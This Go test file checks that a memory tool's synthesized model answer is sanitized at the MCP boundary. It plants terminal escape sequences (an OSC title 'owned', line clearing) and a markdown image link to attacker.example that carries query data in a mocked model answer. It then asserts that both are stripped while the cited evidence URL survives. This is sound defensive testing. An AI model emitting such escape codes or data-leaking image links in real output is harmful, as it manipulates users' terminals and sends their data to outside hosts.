package memory

import (
	"strings"
	"testing"

	"github.com/sirerun/serenity/internal/index"
)

// TestSynthesizeNeutralizesAnswer is deep review 001's AI-05 and SEC-M05 at
// the MCP boundary: a model answer carrying terminal escapes and a markdown
// image URL absent from the retrieved evidence reaches the client with the
// control sequences stripped and the URL replaced, while the URL the
// remembered fact itself carried survives.
func TestSynthesizeNeutralizesAnswer(t *testing.T) {
	h, root := newTestHandlers(t)
	const evidenceURL = "https://status.example.org/incident/42"
	saved := acceptanceCall(t, h, "remember", map[string]any{"fact": "neutralreview incident report at " + evidenceURL, "provenance": "on-call notes"})
	if err := index.Rebuild(t.Context(), root, h.deps.Config, h.deps.Index); err != nil {
		t.Fatal(err)
	}
	id := saved["id"].(string)
	h.deps.Composer = &wireReviewCompleter{text: "Report: " + evidenceURL + " [source:" + id + "]" +
		"\x1b]0;owned\x07\r\x1b[2Kall clear\u009bK" +
		" ![x](https://attacker.example/p.png?q=neutralreview)"}
	h.deps.ComposerModelVersion = "configured-alias@v1"

	got := acceptanceCall(t, h, "synthesize", map[string]any{"question": "neutralreview"})
	if got["error"] != nil {
		t.Fatalf("synthesis failed: %v", got)
	}
	answer, _ := got["answer"].(string)
	for _, r := range answer {
		if r != '\n' && r != '\t' && (r < 0x20 || (r >= 0x7f && r < 0xa0)) {
			t.Fatalf("answer carries control character %U: %q", r, answer)
		}
	}
	if strings.Contains(answer, "owned") {
		t.Fatalf("OSC title payload survived: %q", answer)
	}
	if strings.Contains(answer, "attacker.example") || !strings.Contains(answer, "![x]([link removed])") {
		t.Fatalf("URL absent from evidence survived: %q", answer)
	}
	if !strings.Contains(answer, "Report: "+evidenceURL+" [source:"+id+"]") {
		t.Fatalf("evidence URL or citation was altered: %q", answer)
	}
}
